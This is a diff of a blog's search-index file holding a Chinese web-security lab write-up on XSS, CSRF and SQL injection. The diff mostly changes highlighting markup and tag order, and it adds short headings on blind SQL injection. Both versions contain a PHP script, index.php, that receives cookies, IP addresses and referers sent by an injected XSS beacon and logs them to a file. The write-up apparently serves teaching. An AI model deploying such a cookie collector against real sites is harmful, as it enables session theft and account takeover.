@@ -169,7 +169,7 @@
 </ul>
 <p>这个js文件可以在页面中追加一个图片资源, 并且指向我们自己的一台服务器的某个文件(即下面的<code>index.php</code>)并向其发送参数. </p>
 <ul>
-<li><code>index.php</code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">$cookie = $_GET[<span class="string">'cookie'</span>];</span></span><br><span class="line"><span class="php">$time = time();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$ip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span></span><br><span class="line"><span class="php">$referer = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span></span><br><span class="line"><span class="php">$txt = date(<span class="string">"Y/m/d-h:i:s"</span>).<span class="string">" ip="</span>.$ip.<span class="string">"  cookie="</span>.$cookie.<span class="string">" referer="</span>.$referer.<span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $txt;</span></span><br><span class="line"><span class="php">file_put_contents(<span class="string">"log.txt"</span>,$txt,FILE_APPEND);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+<li><code>index.php</code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">$cookie = $_GET[&apos;cookie&apos;];</span><br><span class="line">$time = time();</span><br><span class="line"></span><br><span class="line">$ip = $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line">$referer = $_SERVER[&apos;HTTP_REFERER&apos;];</span><br><span class="line">$txt = date(&quot;Y/m/d-h:i:s&quot;).&quot; ip=&quot;.$ip.&quot;  cookie=&quot;.$cookie.&quot; referer=&quot;.$referer.&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo $txt;</span><br><span class="line">file_put_contents(&quot;log.txt&quot;,$txt,FILE_APPEND);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
@@ -267,16 +267,19 @@
 </li>
 </ol>
 <h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>和上题类似, 只是字符型需要考虑闭合.<br>这里是用<code>&#39;</code>闭合.</p>
+<h3 id="搜索型注入-略"><a href="#搜索型注入-略" class="headerlink" title="搜索型注入(略)"></a>搜索型注入(略)</h3><h3 id="xx型注入-略"><a href="#xx型注入-略" class="headerlink" title="xx型注入(略)"></a>xx型注入(略)</h3><h3 id="布尔盲注-略"><a href="#布尔盲注-略" class="headerlink" title="布尔盲注(略)"></a>布尔盲注(略)</h3><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>这道题的特点是, 查询结果无论正确与否都不会显示出来</p>
+<p>所以可以使用时间盲注.</p>
+<p>例如, 想要判断<code>database()</code>的文本长度, 就可以</p>
 ]]></content>
       
         
         <tags>
             
-            <tag> sql注入 </tag>
-            
             <tag> xss </tag>
             
             <tag> csrf </tag>
+            
+            <tag> sql注入 </tag>
             
         </tags>
         
@@ -837,9 +840,9 @@
         
         <tags>
             
-            <tag> 主机扫描 </tag>
-            
             <tag> web </tag>
+            
+            <tag> 主机扫描 </tag>
             
         </tags>
         
